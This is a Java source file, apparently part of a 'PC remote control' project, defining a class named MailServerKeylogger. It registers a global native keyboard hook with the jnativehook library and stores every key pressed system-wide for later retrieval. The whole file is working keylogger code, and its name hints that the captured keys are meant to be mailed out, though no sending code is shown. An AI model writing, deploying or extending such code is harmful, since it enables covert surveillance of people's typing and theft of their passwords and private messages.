package com.example.pcremotecontrol.servers;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.util.ArrayList;
import java.util.List;

public class MailServerKeylogger implements NativeKeyListener {
    static private List<String> keyloggerResult = new ArrayList<String>();
    private static MailServerKeylogger instance = new MailServerKeylogger();

    public static MailServerKeylogger getInstance() {
        if (instance == null) {
            instance = new MailServerKeylogger();
        }
        return instance;
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        keyloggerResult.add(NativeKeyEvent.getKeyText(e.getKeyCode()));
        NativeKeyListener.super.nativeKeyPressed(e);
    }

    public List<String> getKeyloggerResult() {
        GlobalScreen.removeNativeKeyListener(getInstance());
        return keyloggerResult;
    }

    public void startKeylogger() throws NativeHookException {
        if(!GlobalScreen.isNativeHookRegistered()) {
            GlobalScreen.registerNativeHook();
        }
        GlobalScreen.addNativeKeyListener(getInstance());
        keyloggerResult.clear();
    }

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            throw new RuntimeException(e);
        }
    }
}

